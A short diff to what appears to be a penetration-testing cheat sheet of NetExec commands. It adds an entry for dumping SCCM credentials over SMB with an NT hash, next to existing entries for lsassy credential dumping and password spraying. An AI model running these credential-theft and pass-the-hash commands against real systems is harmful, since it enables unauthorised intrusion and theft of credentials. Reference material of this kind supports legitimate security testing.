@@ -204,6 +204,13 @@ nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> -M lsassy
 nxc smb <ip> --local-auth -u <user> -H <nt_hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
 ```
 
+## smb - dump sccm 
+#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
+
+```bash
+nxc smb <ip> --local-auth -u <user> -H <nt_hash> --sccm [{wmi,disk}]
+```
+
 ## smb - password spray (user=password)
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 
 
